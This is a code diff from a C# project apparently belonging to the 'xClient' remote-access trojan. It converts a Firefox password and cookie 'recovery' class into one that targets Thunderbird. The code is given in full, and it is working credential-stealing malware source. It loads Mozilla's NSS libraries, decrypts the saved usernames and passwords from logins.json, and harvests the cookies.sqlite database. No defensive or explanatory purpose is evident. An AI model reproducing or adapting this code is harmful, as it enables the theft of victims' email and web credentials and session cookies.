@@ -1,51 +1,51 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
 using xClient.Core.Data;
-using xClient.Core.Recovery.Utilities;
-using xClient.Core.Utilities;
-using System.Diagnostics;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
+using xClient.Core.Recovery.Utilities;
+using xClient.Core.Utilities;
 
-namespace xClient.Core.Recovery.Browsers
+namespace xClient.Core.Recovery.Other
 {
     /// <summary>
-    /// A small class to recover Firefox Data
+    /// A small class to recover thunderbird Data
     /// </summary>
-    public static class Firefox
+    public static class Thunderbird
     {
-        public static IntPtr NssModule;
+        public static IntPtr nssModule;
 
-        private static DirectoryInfo firefoxPath;
-        private static DirectoryInfo firefoxProfilePath;
+        private static DirectoryInfo thunderbirdPath;
+        private static DirectoryInfo thunderbirdProfilePath;
 
-        private static FileInfo firefoxLoginFile;
-        private static FileInfo firefoxCookieFile;
+        private static FileInfo thunderbirdLoginFile;
+        private static FileInfo thunderbirdCookieFile;
 
-        static Firefox()
+        static Thunderbird()
         {
             try
             {
-                firefoxPath = GetFirefoxInstallPath();
-                if (firefoxPath == null)
-                    throw new NullReferenceException("Firefox is not installed, or the install path could not be located");
+                thunderbirdPath = GetthunderbirdInstallPath();
+                if (thunderbirdPath == null)
+                    throw new NullReferenceException("thunderbird is not installed, or the install path could not be located");
 
-                firefoxProfilePath = GetProfilePath();
-                if (firefoxProfilePath == null)
-                    throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");
+                thunderbirdProfilePath = GetProfilePath();
+                if (thunderbirdProfilePath == null)
+                    throw new NullReferenceException("thunderbird does not have any profiles, has it ever been launched?");
 
-                firefoxLoginFile = GetFile(firefoxProfilePath, "logins.json");
-                if (firefoxLoginFile == null)
-                    throw new NullReferenceException("Firefox does not have any logins.json file");
+                thunderbirdLoginFile = GetFile(thunderbirdProfilePath, "logins.json");
+                if (thunderbirdLoginFile == null)
+                    throw new NullReferenceException("thunderbird does not have any logins.json file");
 
-                firefoxCookieFile = GetFile(firefoxProfilePath, "cookies.sqlite");
-                if (firefoxCookieFile == null)
-                    throw new NullReferenceException("Firefox does not have any cookie file");
+                thunderbirdCookieFile = GetFile(thunderbirdProfilePath, "cookies.sqlite");
+                if (thunderbirdCookieFile == null)
+                    throw new NullReferenceException("thunderbird does not have any cookie file");
             }
             catch (Exception)
             {
@@ -55,20 +55,20 @@ namespace xClient.Core.Recovery.Browsers
 
         #region Public Members
         /// <summary>
-        /// Recover Firefox Passwords from logins.json
+        /// Recover thunderbird Passwords from logins.json
         /// </summary>
         /// <returns>List of Username/Password/Host</returns>
         public static List<RecoveredAccount> GetSavedPasswords()
         {
-            List<RecoveredAccount> firefoxPasswords = new List<RecoveredAccount>();
+            List<RecoveredAccount> thunderbirdPasswords = new List<RecoveredAccount>();
             try
             {
                 // init libs
-                InitializeDelegates(firefoxProfilePath, firefoxPath);
+                InitializeDelegates(thunderbirdProfilePath, thunderbirdPath);
 
                 JsonFFData ffLoginData = new JsonFFData();
 
-                using (StreamReader sr = new StreamReader(firefoxLoginFile.FullName))
+                using (StreamReader sr = new StreamReader(thunderbirdLoginFile.FullName))
                 {
                     string json = sr.ReadToEnd();
                     ffLoginData = JsonUtil.Deserialize<JsonFFData>(json);
@@ -78,26 +78,25 @@ namespace xClient.Core.Recovery.Browsers
                 {
                     string username = Decrypt(data.encryptedUsername);
                     string password = Decrypt(data.encryptedPassword);
-                    Uri host = new Uri(data.formSubmitURL);
+                    string host = data.hostname;
 
-                    firefoxPasswords.Add(new RecoveredAccount() { URL = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
+                    thunderbirdPasswords.Add(new RecoveredAccount() { URL = host, Username = username, Password = password, Application = "Thunderbird" });
                 }
             }
-            catch (Exception)
+            catch (Exception e)
             {
             }
-
-            return firefoxPasswords;
+            return thunderbirdPasswords;
         }
 
         /// <summary>
-        /// Recover Firefox Cookies from the SQLite3 Database
+        /// Recover thunderbird Cookies from the SQLite3 Database
         /// </summary>
         /// <returns>List of Cookies found</returns>
-        public static List<FirefoxCookie> GetSavedCookies()
+        public static List<thunderbirdCookie> GetSavedCookies()
         {
-            List<FirefoxCookie> data = new List<FirefoxCookie>();
-            SQLiteHandler sql = new SQLiteHandler(firefoxCookieFile.FullName);
+            List<thunderbirdCookie> data = new List<thunderbirdCookie>();
+            SQLiteHandler sql = new SQLiteHandler(thunderbirdCookieFile.FullName);
             if (!sql.ReadTable("moz_cookies"))
                 throw new Exception("Could not read cookie table");
 
@@ -122,7 +121,7 @@ namespace xClient.Core.Recovery.Browsers
                     DateTime exp = FromUnixTime(expiryTime);
                     bool expired = currentTime > expiryTime;
 
-                    data.Add(new FirefoxCookie()
+                    data.Add(new thunderbirdCookie()
                     {
                         Host = h,
                         ExpiresUTC = exp,
@@ -144,24 +143,24 @@ namespace xClient.Core.Recovery.Browsers
         #endregion
 
         #region Functions
-        private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
+        private static void InitializeDelegates(DirectoryInfo thunderbirdProfilePath, DirectoryInfo thunderbirdPath)
         {
-            //Return if under firefox 35 (35+ supported)
-            //Firefox changes their DLL heirarchy/code with different releases
+            //Return if under thunderbird 35 (35+ supported)
+            //thunderbird changes their DLL heirarchy/code with different releases
             //So we need to avoid trying to load a DLL in the wrong order
             //To prevent pop up saying it could not load the DLL
-            if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major < new Version("35.0.0").Major)
-                return;
+            //if (new Version(FileVersionInfo.GetVersionInfo(thunderbirdPath.FullName + "\\thunderbird.exe").FileVersion).Major < new Version("35.0.0").Major)
+           //     return;
 
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
-            NssModule = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "NSS_Init");
+            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr100.dll");
+            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp100.dll");
+            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr120.dll");
+            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp120.dll");
+            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\mozglue.dll");
+            nssModule = NativeMethods.LoadLibrary(thunderbirdPath.FullName +  "\\nss3.dll");
+            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSS_Init");
             NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
-           var test =  NSS_Init(firefoxProfilePath.FullName);
+            var test = NSS_Init(thunderbirdProfilePath.FullName);
             long keySlot = PK11_GetInternalKeySlot();
             PK11_Authenticate(keySlot, true, 0);
         }
@@ -180,14 +179,14 @@ namespace xClient.Core.Recovery.Browsers
         #region File Handling
         private static DirectoryInfo GetProfilePath()
         {
-            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
+            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Thunderbird\Profiles";
             if (!Directory.Exists(raw))
-                throw new Exception("Firefox Application Data folder does not exist!");
+                throw new Exception("thunderbird Application Data folder does not exist!");
             DirectoryInfo profileDir = new DirectoryInfo(raw);
 
             DirectoryInfo[] profiles = profileDir.GetDirectories();
             if (profiles.Length == 0)
-                throw new IndexOutOfRangeException("No Firefox profiles could be found");
+                throw new IndexOutOfRangeException("No thunderbird profiles could be found");
 
             // return first profile
             return profiles[0];
@@ -198,16 +197,16 @@ namespace xClient.Core.Recovery.Browsers
             {
                 return file;
             }
-            throw new Exception("No Firefox logins.json was found");
+            throw new Exception("No thunderbird logins.json was found");
         }
-        private static DirectoryInfo GetFirefoxInstallPath()
+        private static DirectoryInfo GetthunderbirdInstallPath()
         {
-            // get firefox path from registry
+            // get thunderbird path from registry
             using (RegistryKey key = PlatformHelper.Is64Bit ?
                 RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
-                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox") :
+                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla firefox") :
                 RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
-                    @"SOFTWARE\Mozilla\Mozilla Firefox"))
+                    @"SOFTWARE\Mozilla\Mozilla firefox"))
             {
                 if (key == null) return null;
 
@@ -215,7 +214,7 @@ namespace xClient.Core.Recovery.Browsers
 
                 // we'll take the first installed version, people normally only have one
                 if (installedVersions.Length == 0)
-                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
+                    throw new IndexOutOfRangeException("No installs of thunderbird recorded in its key.");
 
                 using (RegistryKey mainInstall = key.OpenSubKey(installedVersions[0]))
                 {
@@ -226,10 +225,10 @@ namespace xClient.Core.Recovery.Browsers
                     if (string.IsNullOrEmpty(installPath))
                         throw new NullReferenceException("Install string was null or empty");
 
-                    firefoxPath = new DirectoryInfo(installPath);
+                    thunderbirdPath = new DirectoryInfo(installPath);
                 }
             }
-            return firefoxPath;
+            return thunderbirdPath;
         }
         #endregion
 
@@ -252,10 +251,6 @@ namespace xClient.Core.Recovery.Browsers
             return moduleHandle;
         }
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool FreeLibrary(IntPtr hModule);
-
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate long NSS_InitPtr(string configdir);
 
@@ -271,9 +266,6 @@ namespace xClient.Core.Recovery.Browsers
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
 
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate int NSS_ShutdownPtr();
-
         [StructLayout(LayoutKind.Sequential)]
         private struct TSECItem
         {
@@ -286,35 +278,35 @@ namespace xClient.Core.Recovery.Browsers
 
         #region JSON
         // json deserialize classes
-       /* private class JsonFFData
-        {
+        /* private class JsonFFData
+         {
 
-            public long nextId;
-            public LoginData[] logins;
-            public string[] disabledHosts;
-            public int version;
+             public long nextId;
+             public LoginData[] logins;
+             public string[] disabledHosts;
+             public int version;
 
-        }
-        private class LoginData
-        {
+         }
+         private class LoginData
+         {
 
-            public long id;
-            public string hostname;
-            public string url;
-            public string httprealm;
-            public string formSubmitURL;
-            public string usernameField;
-            public string passwordField;
-            public string encryptedUsername;
-            public string encryptedPassword;
-            public string guid;
-            public int encType;
-            public long timeCreated;
-            public long timeLastUsed;
-            public long timePasswordChanged;
-            public long timesUsed;
+             public long id;
+             public string hostname;
+             public string url;
+             public string httprealm;
+             public string formSubmitURL;
+             public string usernameField;
+             public string passwordField;
+             public string encryptedUsername;
+             public string encryptedPassword;
+             public string guid;
+             public int encType;
+             public long timeCreated;
+             public long timeLastUsed;
+             public long timePasswordChanged;
+             public long timesUsed;
 
-        }*/
+         }*/
         public class Login
         {
             public int id { get; set; }
@@ -343,37 +335,28 @@ namespace xClient.Core.Recovery.Browsers
         #endregion
 
         #region Delegate Handling
-
-        private static void NSS_Shutdown()
-        {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "NSS_Shutdown");
-            NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
-            ptr();
-            FreeLibrary(NssModule);
-
-        }
         // Credit: http://www.codeforge.com/article/249225
         private static long PK11_GetInternalKeySlot()
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "PK11_GetInternalKeySlot");
+            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
             PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
             return ptr();
         }
         private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "PK11_Authenticate");
+            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_Authenticate");
             PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
             return ptr(slot, loadCerts, wincx);
         }
         private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "NSSBase64_DecodeBuffer");
+            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
             NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
             return ptr(arenaOpt, outItemOpt, inStr, inLen);
         }
         private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "PK11SDR_Decrypt");
+            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11SDR_Decrypt");
             PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
             return ptr(ref data, ref result, cx);
         }
@@ -396,7 +379,7 @@ namespace xClient.Core.Recovery.Browsers
         }
         #endregion
     }
-    public class FirefoxPassword
+    public class thunderbirdPassword
     {
         public string Username { get; set; }
         public string Password { get; set; }
@@ -406,7 +389,7 @@ namespace xClient.Core.Recovery.Browsers
             return string.Format("User: {0}{3}Pass: {1}{3}Host: {2}", Username, Password, Host.Host, Environment.NewLine);
         }
     }
-    public class FirefoxCookie
+    public class thunderbirdCookie
     {
         public string Host { get; set; }
         public string Name { get; set; }
